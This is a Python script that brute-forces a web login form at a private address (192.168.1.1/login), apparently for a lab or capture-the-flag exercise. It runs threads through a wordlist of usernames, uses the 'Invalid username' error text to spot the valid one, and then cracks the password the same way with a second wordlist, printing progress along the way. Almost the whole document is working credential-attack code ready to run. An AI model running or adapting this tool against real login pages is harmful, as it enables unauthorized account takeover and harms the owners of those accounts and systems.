import requests
import threading
import math
import time
from sys import argv

class ThreadData():
  def __init__(self, chunk, start):
    self.chunk=chunk
    self.index=0
    self.start=start

  def get_absolute_start(self):
    return self.start

  def get_chunk_size(self):
    return len(self.chunk)
  
  def get_next_entry(self):
    res = self.chunk[self.index]
    self.index+=1
    return res

  def get_finished_count(self):
    return self.index

  def is_done(self):
    return self.get_finished_count()==len(self.chunk)

  def get_progress(self):
    return self.get_finished_count()/len(self.chunk)

  def stringify(self):
    return """chunk beginning at {} with {}
    Progress {} out of {} ({:.2%})  - current word: {}
    """.format(self.start, self.chunk[0], self.index, len(self.chunk), self.get_progress(), self.chunk[self.index]) 

def wordlist_to_chunks(filename, num_chunks):
  f = open(filename, "r")
  entries = [e.strip() for e in f.readlines()]
  f.close()
  n=len(entries)
  chunk_size=math.ceil(n/num_chunks)
  return [entries[i:i+chunk_size] for i in range(0,n,chunk_size)]

def chunks_to_ThreadData(chunks):
  res=[]
  acc=0
  for c in chunks:
    res.append(ThreadData(c, acc))
    acc+=len(c)
  return res

def thread_process_chunk(url, data, fail_string, results, variable_param, event):
  post_params=dict(tuple((e,results[e]) for e in  results))
  while not data.is_done() and not event.is_set():
    e = data.get_next_entry()
    post_params[variable_param]=e
    response = requests.post(url, data=post_params)
    if not fail_string in response.text:
      print('hoooueunh', e) # this is supposed to be an intrigued Jiraiya moan
      results[variable_param]=e
      # No need for locks since only one thread is going to access this variable in write mode
      event.set()
      return e
  return None

def stringify_time(seconds):
  hours=seconds//3600
  minutes=(seconds%3600)//60
  seconds = seconds%60
  return "{}h {}m {}s".format(*[int(e) for e in [hours, minutes, seconds]])

# values might not be exact because of multi-threading
def report_global_progress(thread_data, start_time):
  t=time.time()
  thread_data_string = [td.stringify() for td in thread_data]
  total_finished_count=sum(td.get_finished_count() for td in thread_data)
  total_size = sum(td.get_chunk_size() for td in thread_data)
  print("=======\n".join(thread_data_string))
  print("Time since start:", stringify_time(t-start_time))
  print("Total tested:", total_finished_count, "out of", total_size, "{:.2%}".format(total_finished_count/total_size))
  print("------------------------------------------------------------------------------\n")

url = 'http://192.168.1.1/login'
num_threads=int(argv[1])

target_found = threading.Event()
list_filename="usernames.txt"
username_string="username"
password_string="password"
results={username_string: '', password_string: ''}

chunks = wordlist_to_chunks(list_filename, num_threads)
thread_data = chunks_to_ThreadData(chunks)
print("Looking for username with {} threads...".format(num_threads))
post_params =  ((username_string, ""), (password_string, ""))
threads=[threading.Thread(target=thread_process_chunk, args=(url, thread_data[i], "Invalid username", results, username_string, target_found), daemon=True) for i in range(len(chunks)) ]
start_time=time.time()
report_global_progress(thread_data, start_time)
for t in threads:
  t.start()

while not target_found.wait(timeout=10):
  report_global_progress(thread_data, start_time)

print('Username found. It\'s "{}"'.format(results[username_string]))

target_found = threading.Event()
list_filename="some_words_list.txt"
chunks = wordlist_to_chunks(list_filename, num_threads)
thread_data = chunks_to_ThreadData(chunks)
print("Looking for password with {} threads...".format(num_threads))
threads=[threading.Thread(target=thread_process_chunk, args=(url, thread_data[i], "Invalid password", results, password_string, target_found), daemon=True) for i in range(len(chunks)) ]
start_time=time.time()
report_global_progress(thread_data, start_time)
for t in threads:
  t.start()

while not target_found.wait(timeout=10):
  report_global_progress(thread_data, start_time)

print(results)
